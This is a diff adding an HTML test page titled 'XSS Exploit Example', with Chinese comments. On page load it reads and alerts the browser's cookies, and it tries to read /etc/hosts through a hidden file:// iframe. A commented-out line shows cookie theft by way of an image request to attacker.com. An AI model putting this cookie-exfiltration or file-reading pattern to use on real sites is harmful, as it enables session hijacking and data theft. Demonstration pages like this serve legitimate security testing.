@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XSS Exploit Example</title>
+    <script>
+        // 读取浏览器的 Cookie
+        function readCookies() {
+            var cookies = document.cookie;
+            alert("Browser Cookies: " + cookies);
+            // 可以通过 HTTP 请求发送到攻击者服务器
+            // var img = new Image();
+            // img.src = "http://attacker.com/steal?cookie=" + encodeURIComponent(cookies);
+        }
+
+        // 试图读取本地 /etc/hosts 文件（可能需要特定浏览器漏洞支持）
+        function readHostsFile() {
+            // 创建一个 iframe 来加载 file:// 协议
+            var iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = 'file:///etc/hosts';
+            document.body.appendChild(iframe);
+
+            // 尝试读取内容（大部分现代浏览器会禁止读取）
+            iframe.onload = function() {
+                try {
+                    var doc = iframe.contentDocument || iframe.contentWindow.document;
+                    alert("Hosts File Content: " + doc.body.innerText);
+                } catch (e) {
+                    alert("Unable to read /etc/hosts file");
+                }
+            };
+        }
+
+        // 自动调用方法以进行测试
+        window.onload = function() {
+            readCookies();
+            readHostsFile();
+        }
+    </script>
+</head>
+<body>
+    <h1>XSS Test Page</h1>
+    <p>This page tries to read browser cookies and /etc/hosts file.</p>
+</body>
+</html>
